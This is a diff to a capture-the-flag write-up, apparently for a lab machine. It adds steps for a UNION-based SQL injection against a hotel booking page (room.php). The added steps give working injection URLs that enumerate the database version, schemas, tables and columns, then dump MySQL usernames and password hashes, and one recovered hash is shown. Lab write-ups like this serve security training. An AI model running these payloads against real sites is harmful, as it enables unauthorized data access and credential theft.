@@ -123,7 +123,7 @@ http://10.10.10.143/room.php?cod=5 union select null,null,null,null,null,null,nu
 
 
 
-### Step 2: Column Location and Type
+### Step 2: Testing for Visible Columns Location and Type
 + The next step is to check which of these columns are actually visible (determine which of these columns are getting outputted on the page), and can be injected with the information we exfiltrate from the SQL DB.
 + Let's try the union statement `union select 1,2,3,4,5,6,7`: `http://10.10.10.143/room.php?cod=5%20union%20select%201,2,3,4,5,6,7`
 + That returns the output of the **first** select statement, but not the second. A possible reason is that the application only prints one entry at a time.
@@ -139,6 +139,71 @@ http://10.10.10.143/room.php?cod=5 union select null,null,null,null,null,null,nu
 + Tells us columns 2,3,4,5 are injectible for exfiltration.
 + See that column 5 is the picture, 2 seems to be the room title, 3 must be the price, and 4 must be the description text.
 + The second parameter of the select statement is originally "Classic Double Room", and so the data type of that row is probably string. Maybe work with the second parameter.
+
+
+### Step 3: Enumerating DBMS Characteristics
++ Try to enumerate the DBMS version, DB files location, current SQL user and current database in use with:
+```
+http://10.10.10.143/room.php?cod=55%20union%20select%201,@@version,@@datadir,user(),database(),6,7;--%20-
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eb62cf73-f4b8-409e-8470-1e96c9a11351)
+
++ Database is MariaDB 10.1.48. Next, tyr to print out the list of password hashes step by step.
+
++ **List DBs:** List DBs using **group_concat()** which puts all the values from different rows into one string, and concats multiple rows of the same table with one query. Otherwise, you get nothing because of querying more than one column in the sub select query. In order to output multiple columns, you can use the group_concat() function.
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(schema_name),4,5,6,7+from+information_schema.schemata;-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/505dc514-807d-4b4f-917b-2c6481afb3a5)
+
++ **Show Tables in hotel:** To list the tables in the hotel DB:
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='hotel';-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/221d44c9-2037-47dc-9f76-ce5706a659e0)
+
++ **Show Columns in room:** Enumerate columns in table room:
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='room';-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/18e3b52f-57d8-474e-ad0c-3d15c5ef9bfd)
+
++ **Show Tables in mysql:** There are no any usernames or creds in this DB. Control the default mysql DB, and see a lot of tables.
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='mysql';-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1eddaf2-30c6-4f41-8b01-91e65b16afe0)
+
+
++ **Show Columns in user:** But just one table, user table is interesting, and enumerate columns in that table with:
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='user';-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71ba464b-4c30-40df-aa35-7e572b9b91aa)
+
++ **Get Username and Password Hashes:** There are some interesting columns, and then enumerate the entries for User, Password adding as data delimiters with:
+```
+http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password),4,5,6,7+from+mysql.user;-- -
+
+http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(user,":",password) FROM mysql.user),4,5,6,7;-- -
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/982a4737-3951-4842-9cf8-5cba91bff2d8)
+
+
+
++ x
+```
+DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+```
+
+
 
 
 ## Gaining Access
